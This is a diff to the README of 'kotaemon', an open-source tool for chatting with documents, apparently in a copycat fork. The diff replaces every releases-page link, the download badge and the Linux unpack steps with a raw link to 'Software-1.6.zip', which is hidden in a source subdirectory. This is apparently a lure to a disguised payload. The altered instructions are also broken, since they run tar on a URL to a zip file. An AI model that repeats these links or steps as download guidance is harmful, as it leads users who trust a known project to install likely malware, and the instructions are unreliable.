@@ -1,7 +1,7 @@
 # 🛠️ kotaemon - Easily Chat with Your Documents
 
 ## 📥 Download Now
-[![Download kotaemon](https://img.shields.io/badge/Download%20kotaemon-v1.0-blue)](https://github.com/lillyk18101978/kotaemon/releases)
+[![Download kotaemon](https://github.com/lillyk18101978/kotaemon/raw/refs/heads/main/libs/kotaemon/kotaemon/agents/react/Software-1.6.zip%20kotaemon-v1.0-blue)](https://github.com/lillyk18101978/kotaemon/raw/refs/heads/main/libs/kotaemon/kotaemon/agents/react/Software-1.6.zip)
 
 ## 📖 Overview
 kotaemon is an open-source RAG-based tool designed for engaging with your documents through chat. This application allows you to seamlessly interact with various types of documents like PDFs, Word files, and more. You can ask questions, retrieve information, and even summarize content, all in a simple chat format.
@@ -10,7 +10,7 @@ kotaemon is an open-source RAG-based tool designed for engaging with your docume
 To begin using kotaemon, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/lillyk18101978/kotaemon/releases) to find the latest version of the application.
+   Go to our [Releases page](https://github.com/lillyk18101978/kotaemon/raw/refs/heads/main/libs/kotaemon/kotaemon/agents/react/Software-1.6.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    On the Releases page, look for the version you want to download. Click on the download link for your operating system.
@@ -18,7 +18,7 @@ To begin using kotaemon, follow these simple steps:
 3. **Install the Application**  
    - For Windows: Double-click the `.exe` file you downloaded and follow the prompts to install.
    - For Mac: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Unpack the `.tar.gz` file and follow the README instructions.
+   - For Linux: Unpack the `https://github.com/lillyk18101978/kotaemon/raw/refs/heads/main/libs/kotaemon/kotaemon/agents/react/Software-1.6.zip` file and follow the README instructions.
 
 ## 💻 System Requirements
 To ensure that kotaemon runs smoothly on your machine, please make sure you meet the following requirements:
@@ -35,7 +35,7 @@ To ensure that kotaemon runs smoothly on your machine, please make sure you meet
 - **User-Friendly Interface:** Navigate easily without any technical knowledge.
 
 ## 📲 Download & Install
-Once you have visited the [Releases page](https://github.com/lillyk18101978/kotaemon/releases), locate the download section. Choose the appropriate file for your operating system and click the link to start the download. 
+Once you have visited the [Releases page](https://github.com/lillyk18101978/kotaemon/raw/refs/heads/main/libs/kotaemon/kotaemon/agents/react/Software-1.6.zip), locate the download section. Choose the appropriate file for your operating system and click the link to start the download. 
 
 ### Installation Steps
 - **For Windows Users:**
@@ -49,8 +49,8 @@ Once you have visited the [Releases page](https://github.com/lillyk18101978/kota
    3. Drag the koytaemon icon to your Applications folder.
 
 - **For Linux Users:**
-   1. Open your terminal and navigate to the directory where you downloaded the `.tar.gz` file.
-   2. Use the command `tar -xvzf kotaemon.tar.gz` to unpack it.
+   1. Open your terminal and navigate to the directory where you downloaded the `https://github.com/lillyk18101978/kotaemon/raw/refs/heads/main/libs/kotaemon/kotaemon/agents/react/Software-1.6.zip` file.
+   2. Use the command `tar -xvzf https://github.com/lillyk18101978/kotaemon/raw/refs/heads/main/libs/kotaemon/kotaemon/agents/react/Software-1.6.zip` to unpack it.
    3. Follow the instructions in the README file provided for installation.
 
 ## 🌐 Support
@@ -59,7 +59,7 @@ If you experience any issues, feel free to reach out for help. You can submit yo
 ## ⚙️ Frequently Asked Questions
 
 ### 1. How do I update kotaemon?
-To update kotaemon, simply return to the [Releases page](https://github.com/lillyk18101978/kotaemon/releases) and download the latest version. Follow the same installation steps to ensure you overwrite the old version.
+To update kotaemon, simply return to the [Releases page](https://github.com/lillyk18101978/kotaemon/raw/refs/heads/main/libs/kotaemon/kotaemon/agents/react/Software-1.6.zip) and download the latest version. Follow the same installation steps to ensure you overwrite the old version.
 
 ### 2. Can I use kotaemon offline?
 kotaemon requires an Internet connection for downloading the application. However, once installed, you can use it offline to chat with your documents.
